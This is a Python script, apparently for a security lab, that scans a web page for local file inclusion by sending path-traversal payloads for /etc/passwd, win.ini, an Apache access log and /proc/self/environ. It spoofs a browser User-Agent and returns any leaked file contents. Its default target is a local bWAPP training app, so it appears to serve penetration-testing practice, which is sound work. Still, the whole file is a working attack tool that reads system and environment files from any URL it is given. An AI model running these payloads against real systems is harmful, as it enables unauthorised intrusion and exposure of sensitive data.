import requests
import re
import json
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def create_session():
    """
    Creates a requests session with a retry strategy.
    
    Returns:
        requests.Session: A session object configured with retries and headers.
    """
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    })
    return session

def check_lfi_vulnerability(session, url, payload, response_pattern):
    """
    Checks for Local File Inclusion (LFI) vulnerability.
    
    Args:
        session (requests.Session): The session object to use for the request.
        url (str): The URL to check for LFI vulnerability.
        payload (str): The payload to test for LFI.
        response_pattern (str): The regex pattern to search for in the response.
    
    Returns:
        dict: A dictionary indicating whether the site is vulnerable and details of the response.
    """
    try:
        response = session.get(f"{url}?{payload}")
        response.raise_for_status()
        if re.search(response_pattern, response.text):
            return {"vulnerable": True, "details": response.text[:200]}  
        else:
            return {"vulnerable": False, "details": "Not vulnerable"}
    except requests.RequestException as e:
        return {"vulnerable": False, "details": f"RequestException: {str(e)}"}

def advanced_lfi_detection(base_url):
    """
    Performs an advanced LFI vulnerability detection on the given base URL.
    
    Args:
        base_url (str): The base URL to test for LFI vulnerability.
    
    Returns:
        list: A list of results indicating the details of each tested payload and vulnerability status.
    """
    session = create_session()
    payloads = [
        {"name": "etc/passwd", "payload": "file=../../../../etc/passwd", "response": "root:x:0:0:"},
        {"name": "windows/win.ini", "payload": "file=../../../../windows/win.ini", "response": "[fonts]"},
        {"name": "apache/logs", "payload": "file=../../../../var/log/apache2/access.log", "response": "GET /"},
        {"name": "proc/self/environ", "payload": "file=../../../../proc/self/environ", "response": "USER="}
    ]

    results = []

    for item in payloads:
        name = item['name']
        payload = item['payload']
        response_pattern = item['response']
        result = check_lfi_vulnerability(session, base_url, payload, response_pattern)
        if result['vulnerable']:
            results.append({
                "name": name,
                "payload": payload,
                "url": base_url,
                "vulnerable": result["vulnerable"],
                "details": result["details"]
            })

    return results

if __name__ == "__main__":
    target_url = "http://localhost/bWAPP/rlfi.php"
    results = advanced_lfi_detection(target_url)
    for result in results:
        print(result)
